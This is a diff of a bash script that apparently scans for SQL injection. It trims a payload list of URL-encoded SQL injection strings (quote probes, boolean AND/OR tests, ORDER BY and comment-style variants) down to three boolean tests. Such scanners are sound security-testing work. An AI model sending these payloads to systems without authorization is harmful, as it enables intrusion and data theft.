@@ -11,50 +11,12 @@ declare -a falsePositiveResponse=(
 )
 #
 declare -a payloads=(
-  # Simple payload  
-    "'"
-    "'--"
-    ";"
-    ";--"
-    "--"
-    "-- -"
+
   # Standard boolean injections
   "1%20AND%201=1--%20-"
   "1%20AND%202=1--%20-"
   "1%20OR%201=1--%20-"
-  "1%20OR%201=2--%20-"
-  
-  # Quoted boolean injections
-  "'1%20AND%201=1--%20-"
-  "'1%20AND%202=1--%20-"
-  "'1%20OR%201=1--%20-"
-  "'1%20OR%201=2--%20-"
-  
-  # Double quoted boolean injections
-  "\"%20AND%201=1--%20-"
-  "\"%20AND%202=1--%20-"
-  "\"%20OR%201=1--%20-"
-  "\"%20OR%201=2--%20-"
-  
-  # Parentheses variations
-  "(1)%20AND%201=1--%20-"
-  "(1)%20AND%202=1--%20-"
-  "1)%20AND%201=1--%20-"
-  "1)%20AND%202=1--%20-"
-  
-  # ORDER BY injections
-  "%20order%20by%201--%20-"
-  "%20order%20by%2010--%20-"
-  "'%20order%20by%201--%20-"
-  "'%20order%20by%2010--%20-"
-  "\"%20order%20by%201--%20-"
-  "\"%20order%20by%2010--%20-"
-  
-  # Different comment styles
-  "1%20AND%201=1%23"
-  "1%20AND%202=1%23"
-  "1%20AND%201=1/*comment*/--"
-  "1%20AND%202=1/*comment*/--"
+
 )
 
 declare -a loginPayloads=(
